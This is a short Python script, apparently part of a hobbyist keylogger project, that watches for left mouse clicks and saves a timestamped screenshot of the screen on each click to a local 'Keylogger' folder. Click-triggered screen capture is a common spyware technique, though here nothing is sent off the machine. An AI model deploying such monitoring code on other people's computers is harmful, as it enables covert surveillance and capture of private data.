import win32api
import time
import pyautogui
import random
date=time.localtime().tm_mday,time.localtime().tm_mon,time.localtime().tm_year
today=str(date[0])+'-'+str(date[1])+'-'+str(date[2])
while True:
    a=win32api.GetKeyState(0x01)
    name=random.random()
    if a<0:
        name=random.random()
        myScreenshot=pyautogui.screenshot()
        myScreenshot.save('C:/Users/divyansh/Desktop/Keylogger/screenshot/'+today+' ('+str(name)+')'+'.png')
    time.sleep(0.1)
